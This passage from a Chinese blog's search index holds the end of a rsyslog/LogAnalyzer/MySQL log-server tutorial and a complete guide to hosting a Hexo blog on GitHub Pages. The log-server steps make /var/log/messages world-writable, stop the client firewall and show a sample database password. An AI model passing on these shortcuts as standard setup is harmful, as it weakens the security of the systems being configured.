language-bash"><code class="language-bash"><span class="token function">service</span> rsyslog restart </code></pre><ol start="18"><li>安装loganalyzer软件</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># wget http://download.adiscon.com/loganalyzer/loganalyzer-3.6.3.tar.gz</span><span class="token comment" spellcheck="true"># tar xf loganalyzer-3.6.3.tar.gz</span>//** 这里会提示“是否覆盖文件 index.php” ，输入 y，回车。 **//<span class="token comment" spellcheck="true"># cp -r loganalyzer-3.6.3/src/* /var/www/html/   </span><span class="token comment" spellcheck="true"># cp -r loganalyzer-3.6.3/contrib/* /var/www/html/</span><span class="token comment" spellcheck="true"># cd /var/www/html/</span><span class="token comment" spellcheck="true"># chmod 700 *.sh</span><span class="token comment" spellcheck="true"># ./configure.sh</span><span class="token comment" spellcheck="true"># chmod 777 /var/log/messages</span></code></pre><ol start="19"><li>客户端配置</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># echo "*.* @@192.168.0.101:514" >> /etc/rsyslog.conf</span><span class="token comment" spellcheck="true"># service rsyslog restart</span><span class="token comment" spellcheck="true"># service iptables stop</span></code></pre><h2 id="网页安装-loganalyzer"><a href="#网页安装-loganalyzer" class="headerlink" title="网页安装 loganalyzer"></a>网页安装 loganalyzer</h2><ol><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/ozSn83CImyVOTRG.png" alt="rsylog-2.png"></p><ol start="2"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/swlXuC7PaB1N5Mr.png" alt="rsylog-3.png"></p><ol start="3"><li>Enable User Database 项选择（yes）。Database Host（127.0.0.1，或localhost）；Database Name（Syslog）；Database User（rsyslog）；Database Password（syslogps）</li></ol><p><img src="https://i.loli.net/2019/08/06/teVPvrXEmd7DqYl.png" alt="rsylog-4.png"></p><ol start="4"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/L9yDOIFqkRpJwNE.png" alt="rsylog-5.png"></p><ol start="5"><li>点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/FL1eDsuQZWU9Tlw.png" alt="rsylog-6.png"></p><ol start="6"><li>创建账户，点击 Next</li></ol><p><img src="https://i.loli.net/2019/08/06/6W3qJ9jTbSPpRxN.png" alt="rsylog-7.png"></p><ol start="7"><li>注意大小写，用户名密码同上</li></ol><p><img src="https://i.loli.net/2019/08/06/6bYUcfjrq3aRIgF.png" alt="rsylog-8.png"></p><ol start="8"><li>点击 Finish</li></ol><p><img src="https://i.loli.net/2019/08/06/jhuLeCWd6qmo3J7.png" alt="rsylog-9.png"></p><ol start="9"><li>输入刚才创建的账户的用户名和密码</li></ol><p><img src="https://i.loli.net/2019/08/06/DvyNPQKsR7JGnHe.png" alt="rsylog-10.png"></p><ol start="10"><li>登录界面</li></ol><p><img src="https://i.loli.net/2019/08/06/O3yhQYuqe6p9wPR.png" alt="rsylog-11.png"></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="http://blog.51cto.com/2475296/1783864" target="_blank" rel="noopener">Centos6.5安装rsyslog+loganalyzer+mysql部署日志服务器</a></p><p><a href="https://blog.csdn.net/qq_24038207/article/details/68065553" target="_blank" rel="noopener">centos6.5经典搭建lamp(详细教程)</a></p><p><a href="https://www.jianshu.com/p/f4bcb808824d" target="_blank" rel="noopener">loganalyzer装完报错no syslog records found</a></p><p><a href="https://tecadmin.net/setup-loganalyzer-with-rsyslog-and-mysql/" target="_blank" rel="noopener">How to Setup LogAnalyzer with Rsyslog and MySQL</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人博客</title>
      <link href="/2019/08/06/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/08/06/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建个人博客"><a href="#搭建个人博客" class="headerlink" title="搭建个人博客"></a>搭建个人博客</h1><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li><a href="https://dcc.godaddy.com" target="_blank" rel="noopener">购买域名</a></li><li><a href="https://github.com">创建 github 帐号</a></li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">安装 git</a></li><li><a href="http://nodejs.org/download/" target="_blank" rel="noopener">安装 node</a></li></ol><h3 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h3><ol><li><p>在任意磁盘新建 My_Blog 文件夹（不建议放在 c 盘）</p></li><li><p>在 My_Blog 下，打开 git bash</p></li></ol><p><img src="https://i.loli.net/2019/08/06/ealKG91FMt8kVQO.jpg" alt="hexo-1.jpg"></p><ol start="3"><li>检测 npm 环境配置</li></ol><pre class=" language-bash"><code class="language-bash"> $ <span class="token function">npm</span> -v</code></pre><p><img src="https://i.loli.net/2019/08/06/fEw4A8rSnqJBHTm.png" alt="npm-1.png"></p><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><ol><li>安装 hexo</li></ol><pre class=" language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> -g hexo</code></pre><p><img src="https://i.loli.net/2019/08/06/BFCZcuL7lKdPGY6.png" alt="hexo-2.png"></p><ol start="2"><li>初始化 hexo</li></ol><pre class=" language-bash"><code class="language-bash">$ hexo init</code></pre><p><img src="https://i.loli.net/2019/08/06/QaBZCsWF1qIXhj9.png" alt="hexo-3.png"></p><ol start="3"><li>安装项目依赖的模块<pre class=" language-bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span></code></pre></li></ol><p><img src="https://i.loli.net/2019/08/06/e6ZIMEx419uv5Ot.png" alt="hexo-4.png"></p><ol start="4"><li>开启 hexo服务<pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre></li></ol><p><img src="https://i.loli.net/2019/08/06/weuBq1LOzskljh7.png" alt="hexo-5.png"></p><ol start="5"><li><p>清空静态界面(重新开一个git bash)</p><pre class=" language-bash"><code class="language-bash">$ hexo clean</code></pre><p><img src="https://i.loli.net/2019/08/06/AqO9eblF2jEvdRH.png" alt="hexo-6.png"></p></li><li><p>生成静态界面</p><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p><img src="https://i.loli.net/2019/08/06/MmD8ckTnKGHwqUE.png" alt="hexo-7.png"></p></li><li><p>重新部署</p><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p><img src="https://i.loli.net/2019/08/06/5XV9RgEH2p8btm6.png" alt="hexo-8.png"></p></li><li><p><a href="http://localhost:4000" target="_blank" rel="noopener">测试网址</a></p></li></ol><p><img src="https://i.loli.net/2019/08/06/vSthBLGXYp96ki3.png" alt="hexo-9.png"></p><h3 id="创建、配置-github-项目"><a href="#创建、配置-github-项目" class="headerlink" title="创建、配置 github 项目"></a>创建、配置 github 项目</h3><ol><li>新建仓库</li></ol><p><img src="https://i.loli.net/2019/08/06/8ynTV25hkmvOlpC.png" alt="github-1.png"></p><ol start="2"><li>配置 仓库名、仓库描述、readme 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/b4gS5B8xR9TCuLj.png" alt="github-2.png"></p><ol start="9"><li>修改 _config.yml 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/O6TrKH28dzQkMhU.png" alt="hexo-10.png"></p><ol start="4"><li>测试本地的 hexo 与 github 是否关联成功：<pre class=" language-bash"><code class="language-bash">$ hexo d</code></pre><img src="https://i.loli.net/2019/08/06/X8sFTk9SRWUiNQl.png" alt="hexo-11.png"></li></ol><p><img src="https://i.loli.net/2019/08/06/adOlg3nxBhQKsZG.png" alt="hexo-14.png"></p><ol start="5"><li>测试网址：<a href="https://hhkk2334.github.io（项目名称）" target="_blank" rel="noopener">https://hhkk2334.github.io（项目名称）</a></li></ol><p><img src="https://i.loli.net/2019/08/06/8Lpm5WoqiYPRrXK.png" alt="hexo-13.png"></p><ol start="3"><li>创建文件</li></ol><p><img src="https://i.loli.net/2019/08/06/kfzSd8KZAV6PWGv.png" alt="github-3.png"></p><ol start="6"><li>文件名为 CNAME，内容为购买的 DNS 地址</li></ol><p><img src="https://i.loli.net/2019/08/06/7odqmE9L4ZnRIaz.png" alt="github-4.png"></p><ol start="7"><li>配置项目</li></ol><p><img src="https://i.loli.net/2019/08/06/fMVNu6ldHwBasX8.png" alt="github-5.png"></p><ol start="8"><li>配置 DNS ，开启 https</li></ol><p><img src="https://i.loli.net/2019/08/06/8bSCvhOmRMwYFde.png" alt="github-6.png"></p><h3 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h3><ol><li>管理 DNS</li></ol><p><img src="https://i.loli.net/2019/08/06/jnyNAemYIgBqDLU.png" alt="dns-1.png"></p><ol start="2"><li>ping 项目名称，解析 github 服务器 ip 地址</li></ol><p><img src="https://i.loli.net/2019/08/06/C6x5phaSqGOldn9.png" alt="dns-2.png"></p><ol start="3"><li>修改 dns 正向 和 反向解析</li></ol><p><img src="https://i.loli.net/2019/08/06/4ingqAMBvmy63uR.png" alt="dns-3.png"></p><ol start="4"><li>设置如下：对应 github 服务器 IP 地址和 github 项目名称</li></ol><p><img src="https://i.loli.net/2019/08/06/o3AhHIJLR2VfYby.png" alt="dns-4.png"></p><ol start="9"><li>输入 dns，测试网址是否搭建成功</li></ol><p><img src="https://i.loli.net/2019/08/06/uMrTSbWFKNOJBey.png" alt="github-7.png"></p><h3 id="更换-hexo-主题"><a href="#更换-hexo-主题" class="headerlink" title="更换 hexo 主题"></a>更换 hexo 主题</h3><p>这里以 next 主题为例，可在<a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexo-thems</a> 下载自己喜欢的主题。</p><ol><li>克隆主题</li></ol><pre class=" language-bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/theme-next/hexo-theme-next themes/next</code></pre><p><img src="https://i.loli.net/2019/08/06/ghrsk5MRVK91oib.png" alt="hexocg-1.png"></p><ol start="2"><li>查看 themes 文件夹</li></ol><p><img src="https://i.loli.net/2019/08/06/OElJiRbWvuaoDxs.png" alt="hexocg-2.png"></p><ol start="3"><li>修改 _config.yml 文件</li></ol><p><img src="https://i.loli.net/2019/08/06/nfaqAvwSeprBNik.png" alt="hexocg-4.png"></p><ol start="4"><li>将 themes 修改为，你想应用的主题</li></ol><p><img src="https://i.loli.net/2019/08/06/ODul7kpKMBILc4i.png" alt="hexocg-3.png"></p><ol start="5"><li>清空静态页面</li></ol><pre class=" language-bash"><code class="language-bash">$ hexo clean</code></pre><ol start="6"><li>生成静态页面</li></ol><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><ol start="7"><li>重新部署 </li></ol><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://blog.csdn.net/ainuser/article/details/77609180" target="_blank" rel="noopener">hexo+github搭建个人博客(超详细教程)</a></p><p><a href="https://www.jianshu.com/p/5c6c6cf325cd" target="_blank" rel="noopener">hexo ERROR Deployer not found: github</a></p><p><a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/INSTALLATION.md">theme-next</a></p><p><a href="https://blog.csdn.net/y_z_w123/article/details/78801096" target="_blank" rel="noopener">hexo的安装和主题的替换</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
